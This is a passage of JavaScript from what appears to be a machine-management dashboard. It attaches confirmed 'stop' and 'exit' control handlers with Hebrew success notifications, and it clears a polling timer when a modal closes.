        const success = await sendControl(selectedMachine.id, "stop");
        if (success) {
          updateControlStatus("stopped");
          showNotification(
            "פקודה נשלחה",
            "פקודת עצירה נשלחה בהצלחה",
            "success"
          );
        }
      });
    });
  } else {
    console.error("Control stop button not found");
  }

  const controlExitBtn = document.getElementById("control-exit");
  if (controlExitBtn) {
    controlExitBtn.addEventListener("click", function () {
      console.log("Exit control clicked");
      if (!selectedMachine) {
        console.log("No machine selected");
        return;
      }

      confirmAction("exit", async () => {
        const success = await sendControl(selectedMachine.id, "exit");
        if (success) {
          updateControlStatus("exit");
          showNotification(
            "פקודה נשלחה",
            "פקודת יציאה נשלחה בהצלחה",
            "success"
          );
        }
      });
    });
  } else {
    console.error("Control exit button not found");
  }

  // ניקוי פולינג בסגירת המודאל
  const modalElement = document.getElementById("machineModal");
  if (modalElement) {
    modalElement.addEventListener("hidden.bs.modal", function () {
      if (controlPollInterval) {
        clearInterval(controlPollInterval);
        controlPollInterval = null;
      }
    });
  } else {
    console.error("Modal element not found");
  }

  console.log("All events initialized");
}
